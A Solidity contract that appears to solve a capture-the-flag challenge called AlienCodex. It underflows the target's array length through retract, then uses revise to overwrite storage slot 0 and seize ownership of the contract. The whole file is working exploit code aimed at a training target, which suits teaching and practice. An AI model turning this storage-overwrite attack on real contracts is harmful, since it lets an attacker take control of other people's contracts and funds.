// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IAlienCodex {
    function make_contact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}

contract CodexSolver {

    function takeOwnership(address codex) external {
        IAlienCodex(codex).make_contact();
        IAlienCodex(codex).retract();

        // Array size is stored at position 1 of alien codex storage
        uint256 zeroMemory = (type(uint256).max - uint256(keccak256(abi.encode(1)))) + 1;
        bytes32 newOwner = (bytes32(bytes20(msg.sender)) >> 96);

        IAlienCodex(codex).revise(zeroMemory, newOwner);
    } 

}